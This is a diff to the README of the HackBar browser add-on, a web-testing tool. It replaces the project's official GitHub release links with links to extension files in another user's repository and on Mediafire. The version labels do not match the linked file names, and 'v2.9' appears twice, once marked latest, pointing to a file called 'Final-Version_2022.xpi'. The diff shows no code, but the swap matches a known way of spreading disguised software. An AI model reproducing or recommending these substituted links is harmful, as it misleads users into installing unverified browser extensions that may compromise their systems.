@@ -51,13 +51,14 @@ goto "about:addons"
 Click settings and "install addons from file.." and goto hackbar file and install 
 ![](https://github.com/PhHitachi/Hackbar/blob/master/img/install-from-files.png)
 
-[Releases](https://github.com/PhHitachi/HackBar/releases/):
+## Download Links 
 
-- [Latest](https://github.com/PhHitachi/HackBar/releases/latest)
-- [HackBar v2.6](https://github.com/PhHitachi/HackBar/releases/tag/v2.6)
-- [HackBar v2.7](https://github.com/PhHitachi/HackBar/releases/tag/v2.7)
-- [HackBar v2.8](https://github.com/PhHitachi/HackBar/releases/tag/v2.8)
-- [HackBar v2.9](https://github.com/PhHitachi/HackBar/releases/tag/v2.9) `latest`
+- [Latest](https://www.mediafire.com/file/ctvs6t08le9cjhf/Final-Version_2022.xpi/file)
+- [HackBar v2.6](https://github.com/hac4allofficial/Elite-Hackbar/releases/download/HackBar/Elite-Hackbar_v1.xpi)
+- [HackBar v2.7](https://github.com/hac4allofficial/Elite-Hackbar/releases/download/HackBar/Elite.Hackbar-Pro-v2.xpi)
+- [HackBar v2.8](https://github.com/hac4allofficial/Elite-Hackbar/releases/download/HackBar/Elite.Hackbar-Pro-v3.xpi)
+- [HackBar v2.9](https://github.com/hac4allofficial/Elite-Hackbar/releases/download/HackBar/Elite.Hackbar-Pro-v4.xpi)
+- [HackBar v2.9](https://www.mediafire.com/file/ctvs6t08le9cjhf/Final-Version_2022.xpi/file) `latest`
 
 ### Change logs
 [Read here](https://github.com/PhHitachi/HackBar/blob/master/ChangeLog.md)
